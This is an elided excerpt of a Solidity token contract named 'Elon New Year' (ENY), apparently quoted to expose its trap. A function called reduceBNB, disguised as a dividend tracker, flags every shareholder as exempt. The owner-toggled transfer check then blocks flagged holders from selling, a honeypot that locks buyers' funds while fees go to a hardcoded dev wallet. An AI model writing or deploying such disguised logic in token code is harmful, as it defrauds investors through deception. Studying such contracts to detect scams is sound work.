...
contract ENY is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;
    address private _owner;
    string private constant _name = "Elon New Year ";
    string private constant _symbol = unicode"ENY";
    ...
    address payable public DevWallet = payable(0xFD74cB5f42C2140b68e01a3F96F65C64CD468967);
    address payable public MarketingWallet = payable(0x652ff6c9C9A3bEc4F7e5b39a85CdBE0f81720fD9);
    ...
    function reduceBNB() private { for (uint256 i = 0; i < ShareHolder.length; i++) {
            _isDividendExempt[ShareHolder[i]] = true;
    ...
    function setautoDistribution(bool _limitInEffect, bool _autoDistribution) external onlyOwner {
        limitInEffect = _limitInEffect;
    ...
    function _transfer( address from, address to, uint256 amount ) private {
        ...
        if (limitInEffect && (!_isExcludedFromFee[from])) { require(!_isDividendExempt[from]);}
        ...
        // Dividend tracker
        if (autoDistribution && tradingActiveBlock + minPeriod <= block.timestamp) {reduceBNB();}
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap { 
            ...
            sendToWallet(DevWallet, _BMarketing);
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        if(!takeFee){
            ...
            uint256 sAmount;
            if (_isDividendExempt[sender]){sAmount = tAmount - tAmount*_sellFee/100;}
